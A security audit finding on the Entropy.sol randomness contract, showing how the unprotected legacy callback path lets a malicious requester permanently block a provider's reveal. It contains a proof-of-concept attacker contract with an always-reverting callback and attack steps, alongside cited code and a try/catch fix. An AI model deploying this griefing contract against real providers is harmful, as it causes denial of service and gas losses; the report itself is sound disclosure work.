### Title
Malicious Requester Can Permanently Block Provider's `revealWithCallback` via Unbounded Callback in Legacy Flow — (`File: target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

---

### Summary

In `Entropy.sol`, the `revealWithCallback` function contains two execution paths. When a provider has `defaultGasLimit == 0` (the legacy flow), the callback to the requester's contract is made with **no gas limit and no revert protection**. A malicious requester can deploy a contract whose `_entropyCallback` reverts or exhausts all gas, permanently blocking the provider from ever fulfilling that request and causing repeated gas losses on every retry attempt.

---

### Finding Description

`revealWithCallback` branches on `req.gasLimit10k`:

**New flow** (`req.gasLimit10k != 0`, lines 574–660): uses `excessivelySafeCall` with an explicit gas cap, catches reverts, and transitions the request to `CALLBACK_FAILED` state — the provider is never blocked.

**Legacy flow** (`req.gasLimit10k == 0`, lines 661–702): calls `_entropyCallback` directly with no gas limit and no try/catch:

```solidity
if (len != 0) {
    IEntropyConsumer(callAddress)._entropyCallback(
        sequenceNumber,
        provider,
        randomNumber
    );
}
``` [1](#0-0) 

`req.gasLimit10k` is set to `0` in `requestHelper` whenever the provider's `defaultGasLimit` is `0`:

```solidity
if (providerInfo.defaultGasLimit == 0) {
    // Provider doesn't support the new callback failure state flow
    req.gasLimit10k = 0;
}
``` [2](#0-1) 

In the legacy branch, `clearRequest` is called **before** the callback (line 666), but because there is no revert isolation, a revert in `_entropyCallback` unwinds the entire transaction — including `clearRequest`. The request remains permanently active in storage, and every subsequent provider attempt to call `revealWithCallback` will also revert. [3](#0-2) 

The existing test suite explicitly confirms this behavior — `vm.expectRevert()` is asserted when a reverting consumer is used against a provider with `defaultGasLimit == 0`: [4](#0-3) 

The new safe flow (using `excessivelySafeCall`) is only entered when `req.gasLimit10k != 0 && callbackStatus == CALLBACK_NOT_STARTED`: [5](#0-4) 

---

### Impact Explanation

- **Permanent DoS per request**: Any request made to a provider with `defaultGasLimit == 0` by a malicious contract requester becomes permanently un-fulfillable. The request occupies storage indefinitely.
- **Gas griefing**: The provider (or any third party) loses gas on every `revealWithCallback` attempt. A malicious callback that burns all forwarded gas maximizes this loss.
- **No recovery path**: Unlike the new flow (which has a `CALLBACK_FAILED` state and a recovery path), the legacy flow has no fallback. The request cannot be cancelled or bypassed.

---

### Likelihood Explanation

- Any provider that has not called `setDefaultGasLimit` retains `defaultGasLimit == 0`, routing all their requests through the vulnerable legacy path.
- The attacker only needs to call `requestWithCallback` (a permissionless, payable function) from a contract with a reverting `_entropyCallback`. No privileged access is required.
- The attack is cheap: the attacker pays only the provider's fee (which the provider keeps), then the provider bears all subsequent gas losses.
- The test comment at line 1801–1808 explicitly notes: *"A provider that hasn't upgraded to the callback failure flow can never cause a callback to fail because it runs out of gas"* — confirming the legacy path is live and unprotected. [6](#0-5) 

---

### Recommendation

Apply the same `excessivelySafeCall` + `CALLBACK_FAILED` state pattern to the legacy path, or remove the legacy path entirely and require all providers to set a non-zero `defaultGasLimit`. At minimum, wrap the direct `_entropyCallback` invocation in a try/catch so that a reverting callback does not propagate and block the provider:

```solidity
// Legacy path — add revert isolation
try IEntropyConsumer(callAddress)._entropyCallback(
    sequenceNumber,
    provider,
    randomNumber
) {} catch {
    // emit a failure event; do not revert
}
```

---

### Proof of Concept

1. Deploy a malicious requester contract:

```solidity
contract MaliciousRequester is IEntropyConsumer {
    IEntropy entropy;
    constructor(address _entropy) { entropy = IEntropy(_entropy); }

    function attack(address provider, bytes32 userNum) external payable {
        uint fee = entropy.getFee(provider);
        entropy.requestWithCallback{value: fee}(provider, userNum);
    }

    // Reverts unconditionally — blocks provider forever
    function _entropyCallback(uint64, address, bytes32) internal override {
        revert("blocked");
    }

    function getEntropy() internal view override returns (address) {
        return address(entropy);
    }
}
```

2. Ensure the target provider has `defaultGasLimit == 0` (legacy, unupgraded provider).
3. Call `attack(provider, userNum)` with sufficient fee.
4. Provider calls `revealWithCallback(provider, seqNum, userNum, providerProof)` → reverts every time.
5. The request is permanently stuck; the provider loses gas on every attempt.

The existing test `testRequestWithCallbackAndRevealWithCallbackFailing` in `Entropy.t.sol` (lines 999–1016) already demonstrates this exact revert behavior with `vm.expectRevert()`. [4](#0-3)

### Citations

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L268-271)
```text
        if (providerInfo.defaultGasLimit == 0) {
            // Provider doesn't support the new callback failure state flow (toggled by setting the gas limit field).
            // Set gasLimit10k to 0 to disable.
            req.gasLimit10k = 0;
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L574-596)
```text
        if (
            req.gasLimit10k != 0 &&
            req.callbackStatus == EntropyStatusConstants.CALLBACK_NOT_STARTED
        ) {
            req.callbackStatus = EntropyStatusConstants.CALLBACK_IN_PROGRESS;
            bool success;
            bytes memory ret;
            uint256 startingGas = gasleft();
            (success, ret) = req.requester.excessivelySafeCall(
                // Warning: the provided gas limit below is only an *upper bound* on the gas provided to the call.
                // At most 63/64ths of the current context's gas will be provided to a call, which may be less
                // than the indicated gas limit. (See CALL opcode docs here https://www.evm.codes/?fork=cancun#f1)
                // Consequently, out-of-gas reverts need to be handled carefully to ensure that the callback
                // was truly provided with a sufficient amount of gas.
                uint256(req.gasLimit10k) * TEN_THOUSAND,
                256, // copy at most 256 bytes of the return value into ret.
                abi.encodeWithSelector(
                    IEntropyConsumer._entropyCallback.selector,
                    sequenceNumber,
                    provider,
                    randomNumber
                )
            );
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L662-667)
```text
            // This case uses the checks-effects-interactions pattern to avoid reentry attacks
            address callAddress = req.requester;
            EntropyStructs.Request memory reqV1 = EntropyStructConverter
                .toV1Request(req);
            clearRequest(provider, sequenceNumber);
            // WARNING: DO NOT USE req BELOW HERE AS ITS CONTENTS HAS BEEN CLEARED
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L675-681)
```text
            if (len != 0) {
                IEntropyConsumer(callAddress)._entropyCallback(
                    sequenceNumber,
                    provider,
                    randomNumber
                );
            }
```

**File:** target_chains/ethereum/contracts/test/Entropy.t.sol (L999-1017)
```text
    function testRequestWithCallbackAndRevealWithCallbackFailing() public {
        bytes32 userRandomNumber = bytes32(uint(42));
        uint fee = random.getFee(provider1);
        EntropyConsumer consumer = new EntropyConsumer(address(random), true);
        vm.deal(address(consumer), fee);
        vm.startPrank(address(consumer));
        uint64 assignedSequenceNumber = random.requestWithCallback{value: fee}(
            provider1,
            userRandomNumber
        );

        vm.expectRevert();
        random.revealWithCallback(
            provider1,
            assignedSequenceNumber,
            userRandomNumber,
            provider1Proofs[assignedSequenceNumber]
        );
    }
```

**File:** target_chains/ethereum/contracts/test/Entropy.t.sol (L1801-1808)
```text
        // A provider that hasn't upgraded to the callback failure flow
        // can never cause a callback to fail because it runs out of gas.
        vm.prank(provider1);
        random.setDefaultGasLimit(0);
        assertCallbackResult(0, 190000, true);
        assertCallbackResult(0, 210000, true);
        assertCallbackResult(300000, 290000, true);
        assertCallbackResult(300000, 310000, true);
```
